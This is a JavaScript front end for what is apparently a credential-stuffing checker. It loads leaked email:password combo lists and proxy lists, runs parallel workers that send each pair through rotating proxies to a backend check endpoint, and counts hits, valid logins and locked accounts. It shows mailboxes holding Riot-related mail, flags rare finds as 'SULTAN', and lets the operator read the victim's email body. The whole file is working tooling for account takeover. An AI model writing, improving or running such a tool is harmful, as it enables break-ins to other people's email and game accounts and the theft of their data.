let isRunning = false;
let combos = [];
let proxies = [];
let stats = { checked: 0, hit: 0, valid: 0, bad: 0, locked: 0 };
let currentIdx = 0;
let startTime;
let timerInterval;

// --- INITIALIZATION ---

// Update Thread Slider Label
document.getElementById('thread-range').oninput = function() {
    document.getElementById('thread-val').innerText = this.value;
};

// --- FILE LOADERS ---

// Loader Combo: Membaca format email:pass
document.getElementById('file-combos').onchange = (e) => {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => {
        combos = ev.target.result.split('\n').filter(l => l.includes(':'));
        document.getElementById('label-combos').innerText = `${combos.length} Accounts Loaded`;
        document.getElementById('label-combos').style.color = "#3fb950";
    };
    reader.readAsText(file);
};

// Loader Proxy: Memperbaiki format proxy yang terpotong di HP/Editor
document.getElementById('file-proxies').onchange = (e) => {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = ev => {
        // Gabungkan semua baris menjadi satu string panjang, lalu pisahkan berdasarkan kata 'http'
        let rawContent = ev.target.result.replace(/\r?\n|\r/g, " "); 
        proxies = rawContent.split("http")
            .filter(p => p.trim() !== "")
            .map(p => "http" + p.trim());
        
        document.getElementById('label-proxies').innerText = `${proxies.length} Proxies Cleaned & Loaded`;
        document.getElementById('label-proxies').style.color = "#58a6ff";
    };
    reader.readAsText(file);
};

// --- CORE ENGINE (MULTI-THREADING) ---

async function worker() {
    while (isRunning && currentIdx < combos.length) {
        const id = currentIdx++;
        const combo = combos[id].trim();
        // Rotasi Proxy: Menggunakan modulo agar proxy berputar jika akun > proxy
        const proxy = proxies.length > 0 ? proxies[id % proxies.length] : null;

        try {
            const res = await fetch('/api/check', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ combo, proxy })
            });
            const data = await res.json();

            if (!isRunning) break;

            stats.checked++;
            
            // Logic Filtering Status
            if (data.status === 'HIT') {
                stats.hit++;
                addRow(data); // Masuk ke tabel hanya jika ada data Riot
            } else if (data.status === 'VALID_ONLY') {
                stats.valid++; // Hanya masuk ke statistik (Email hidup tapi no Riot)
            } else if (data.status === 'LOCKED') {
                stats.locked++;
            } else {
                stats.bad++;
            }
            
            updateStats();
        } catch (e) {
            stats.bad++;
            updateStats();
        }
    }
}

// --- CONTROLS ---

async function startChecking() {
    if (combos.length === 0) return alert("Please load combo.txt first!");
    
    // Reset State
    isRunning = true;
    currentIdx = 0;
    startTime = Date.now();
    stats = { checked: 0, hit: 0, valid: 0, bad: 0, locked: 0 };
    
    // UI Update
    document.getElementById('start-btn').disabled = true;
    document.getElementById('stop-btn').disabled = false;
    document.getElementById('res-table').innerHTML = "";
    updateStats();
    startTimer();

    // Spawn Workers (Threads)
    const threadCount = parseInt(document.getElementById('thread-range').value);
    const workers = [];
    for (let i = 0; i < threadCount; i++) {
        workers.push(worker());
    }

    // Wait for all threads to finish
    await Promise.all(workers);
    
    stopSession();
    alert("Checking Session Finished!");
}

function stopSession() {
    isRunning = false;
    clearInterval(timerInterval);
    document.getElementById('start-btn').disabled = false;
    document.getElementById('stop-btn').disabled = true;
}

// --- UI UPDATES ---

function updateStats() {
    document.getElementById('s-checked').innerText = stats.checked;
    document.getElementById('s-hit').innerText = stats.hit;
    document.getElementById('s-valid').innerText = stats.valid;
    document.getElementById('s-bad').innerText = stats.bad;
    document.getElementById('s-locked').innerText = stats.locked;

    // CPM Calculation
    const elapsedMinutes = (Date.now() - startTime) / 60000;
    const cpm = elapsedMinutes > 0 ? Math.floor(stats.checked / elapsedMinutes) : 0;
    document.getElementById('cpm-display').innerHTML = `<i class="fa-solid fa-gauge-high"></i> CPM: ${cpm}`;
}

function addRow(data) {
    const row = document.createElement('tr');
    const badge = data.isSultan ? 
        `<span class="badge-sultan">⭐ SULTAN</span>` : 
        `<span style="color:#3fb950; font-weight:bold;">RIOT HIT</span>`;
    
    // Simpan body email di window object dengan ID unik untuk modal
    const mailKey = `mail_${Math.random().toString(36).substr(2, 9)}`;
    window[mailKey] = data.body;

    row.innerHTML = `
        <td style="font-family:monospace; font-size:12px;">${data.combo.split(':')[0]}</td>
        <td>${badge}</td>
        <td style="color:#888;">${data.count} Messages Scan</td>
        <td>
            <button onclick="viewMail('${mailKey}')" class="btn-primary" style="padding:5px 10px; font-size:10px;">
                <i class="fa-solid fa-eye"></i> VIEW
            </button>
        </td>
    `;
    document.getElementById('res-table').prepend(row);
}

// --- TIMER & MODAL ---

function startTimer() {
    clearInterval(timerInterval);
    timerInterval = setInterval(() => {
        const sec = Math.floor((Date.now() - startTime) / 1000);
        const h = Math.floor(sec / 3600).toString().padStart(2, '0');
        const m = Math.floor((sec % 3600) / 60).toString().padStart(2, '0');
        const s = (sec % 60).toString().padStart(2, '0');
        document.getElementById('time-display').innerHTML = `<i class="fa-solid fa-clock"></i> ${h}:${m}:${s}`;
    }, 1000);
}

function viewMail(key) {
    const content = window[key] || "No content found.";
    document.getElementById('mail-body-content').innerText = content;
    document.getElementById('emailModal').style.display = "block";
}

function closeModal() {
    document.getElementById('emailModal').style.display = "none";
}

// --- EVENT LISTENERS ---
document.getElementById('start-btn').onclick = startChecking;
document.getElementById('stop-btn').onclick = stopSession;

// Close modal if clicking outside
window.onclick = function(event) {
    const modal = document.getElementById('emailModal');
    if (event.target == modal) closeModal();
};
